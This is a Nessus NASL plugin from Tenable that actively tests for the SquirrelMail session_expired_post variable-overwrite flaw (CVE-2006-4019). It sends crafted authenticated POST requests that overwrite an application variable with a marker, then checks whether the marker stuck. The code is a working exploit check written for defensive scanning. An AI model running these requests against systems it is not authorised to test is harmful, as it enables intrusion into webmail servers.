#
# (C) Tenable Network Security
#


if (description) {
  script_id(22230);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-4019");
  script_bugtraq_id(19486);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"27917");

  script_name(english:"SquirrelMail session_expired_post Arbitrary Variables Overwriting Vulnerability");
  script_summary(english:"Tries to overwrite a variable SquirrelMail");
 
  desc = "
Synopsis :

The remote webmail application suffers from a data modification
vulnerability. 

Description :

The installed version of SquirrelMail allows for restoring expired
sessions in an unsafe manner.  Using a specially-crafted expired
session, a user can leverage this issue to take control of arbitrary
variables used by the affected application, which can lead to other
attacks against the system, such as reading or writing of arbitrary
files on the system. 

See also :

http://www.gulftech.org/?node=research&article_id=00108-08112006
http://www.squirrelmail.org/security/issue/2006-08-11
http://archives.neohapsis.com/archives/bugtraq/2006-08/0241.html

Solution :

Apply the patch referenced in the vendor advisory above or upgrade to
SquirrelMail version 1.4.8 or later. 

Risk factor : 

Medium / CVSS Base Score : 4.6
(AV:R/AC:L/Au:NR/C:P/I:P/A:N/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("squirrelmail_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("imap/login", "imap/password");
  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


# nb: the vulnerabilities can't be exploited without being authenticated.
user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) exit(0);


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/squirrelmail"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Exploit the flaw.
  sid = hexstr(MD5(string(SCRIPT_NAME, "_", unixtime())));
  magic = rand_str();
  postdata = string(
    "username=", user, "&",
    "mailbox=", magic
  );
  req = string(
    "POST ", dir, "/src/compose.php HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
    "Cookie: SQMSESSID=", sid, "\r\n",
    "Content-Type: application/x-www-form-urlencoded\r\n",
    "Content-Length: ", strlen(postdata), "\r\n",
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # Login.
  postdata = string(
    "login_username=", user, "&",
    "secretkey=", pass, "&",
    "js_autodetect_results=0&",
    "just_logged_in=1"
  );
  req = string(
    "POST ",  dir, "/src/redirect.php HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "Cookie: SQMSESSID=", sid, "\r\n",
    "Content-Type: application/x-www-form-urlencoded\r\n",
    "Content-Length: ", strlen(postdata), "\r\n",
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);
  if ("Set-Cookie: SQMSESSID=deleted;" >< res) {
    if (log_verbosity > 1) debug_print("couldn't login with supplied imap credentials!", level:0);
    exit(0);
  }
  # - and get the secret key.
  pat = "Set-Cookie: .*key=([^;]+); ";
  matches = egrep(pattern:pat, string:res);
  if (matches)
  {
    foreach match (split(matches)) {
      match = chomp(match);
      key = eregmatch(pattern:pat, string:match);
      if (!isnull(key)) {
        key = key[1];
        break;
      }
    }
  }

  # If we have the secret key...
  if (key)
  {
    # See whether the exploit worked.
    req = http_get(item:string(dir, "/src/compose.php"), port:port);
    req = str_replace(
      string:req,
      find:"User-Agent:",
      replace:string(
        "Cookie: key=", key, "; SQMSESSID=", sid, "\r\n",
        "User-Agent:"
      )
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (res == NULL) exit(0);

    # There's a problem if we see our magic mailbox name.
    if (string(".php?mailbox=", magic) >< res)
    {
      security_warning(port);
      exit(0);
    }
  }
}
